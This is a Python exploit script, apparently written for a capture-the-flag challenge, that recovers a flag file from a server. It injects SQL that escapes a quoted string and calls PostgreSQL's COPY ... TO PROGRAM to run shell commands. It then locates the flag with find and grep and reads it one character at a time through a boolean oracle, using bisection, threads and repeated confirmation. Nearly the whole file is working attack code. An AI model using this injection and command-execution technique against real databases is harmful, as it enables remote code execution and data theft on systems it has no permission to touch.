#!/usr/bin/env python
"""Definitive read of the flag.

Two fixes over final_read.py, both forced by measurement:

  * Case was being *inferred from a negative* ("case-sensitive test failed, so it must be the
    capital"), but a slow request also reads as a failure -- so that rule silently turns a real
    `d` into `D` at random. Case is now decided by a POSITIVE test: `[[:upper:]]` is typed
    entirely in punctuation, so the app's lower-casing cannot damage it, and only if that is
    true *and* the case-sensitive `[d]` is false is the byte uppercase.
  * `sed -n 1p | xargs` added another program to the pipeline that occasionally is not there;
    `grep -v /tmp/` (my own scratch from earlier attempts, which also matches `sun{`) plus
    `sort | head -1` pins one file with nothing but grep/head/sort in the chain.

Every character is additionally required to confirm twice before it is accepted.
"""
import string
import sys
import threading

import extract as E

BASE = ('find / -name "*flag*" -type f -exec grep -ls sun{ {} + 2>/dev/null '
        '| grep -v /tmp/ | sort | head -1')
FIND = 'f=$(%s); grep -aoE "sun[{][^}]*[}]" "$f" | head -1' % BASE
CANDS = list("{}" + string.digits + string.ascii_lowercase + "_-.@!+~")


def klass(chars):
    body = "".join(c for c in chars if c != "-")
    return "[" + body + ("-" if "-" in chars else "") + "]"


def ask(cmd, tries=4):
    payload = "MARS'; COPY (SELECT 1) TO PROGRAM '%s'; SELECT 1; -- " % cmd
    for _ in range(tries):
        if E.ask(payload):
            return True
    return False


def at_raw(k, cls, ic=False, tries=4):
    return ask('%s | cut -c%d | grep -q%sE "%s"' % (FIND, k, "i" if ic else "", cls), tries)


def at(k, chars, ic=False, tries=4):
    return at_raw(k, klass(chars), ic, tries)


def present(k):
    return ask("%s | cut -c%d | grep -q ." % (FIND, k))


def bisect_ic(k):
    lo, hi = 0, len(CANDS) - 1
    while lo < hi:
        mid = (lo + hi) // 2
        if at(k, CANDS[lo:mid + 1], True):
            hi = mid
        else:
            lo = mid + 1
    return CANDS[lo] if at(k, [CANDS[lo]], True) else None


def resolve(k):
    c = bisect_ic(k)
    if c is None:
        return None
    if not c.isalpha():
        return c                                      # digits/symbols: case cannot apply
    if at(k, [c]):
        return c                                     # positive: matches case-sensitively
    if at_raw(k, "[[:upper:]]"):
        return c.upper()                             # positive: it is an uppercase letter
    return None


def length(cap=80):
    lo, hi = 0, cap
    while lo < hi:
        mid = (lo + hi) // 2
        if present(mid + 1):
            lo = mid + 1
        else:
            hi = mid
    return lo


def read(workers=8):
    n = length()
    print("[*] flag length: %d" % n, flush=True)
    vals, lock = {}, threading.Lock()

    def w(k):
        for _ in range(6):
            a = resolve(k)
            b = resolve(k)
            if a and a == b:
                with lock:
                    vals[k] = a
                break
            print("   pos %2d unstable: %r / %r" % (k, a, b), flush=True)
        else:
            with lock:
                vals[k] = "?"
        s = "".join(vals.get(i, "·") for i in range(1, n + 1))
        print("   %-38s pos=%2d (%d calls)" % (s, k, E.CALL[0]), flush=True)
    for i in range(0, n, workers):
        ts = [threading.Thread(target=w, args=(k,), daemon=True) for k in range(i + 1, min(i + workers, n) + 1)]
        for t in ts:
            t.start()
        for t in ts:
            t.join(900)
    return "".join(vals.get(k, "?") for k in range(1, n + 1))


if __name__ == "__main__":
    v = read()
    print("[+] %s" % v, flush=True)
    if v.startswith("sun{") and v.endswith("}") and "?" not in v:
        open("flag.txt", "w").write(v.strip() + "\n")
        print("[*] saved flag.txt", flush=True)
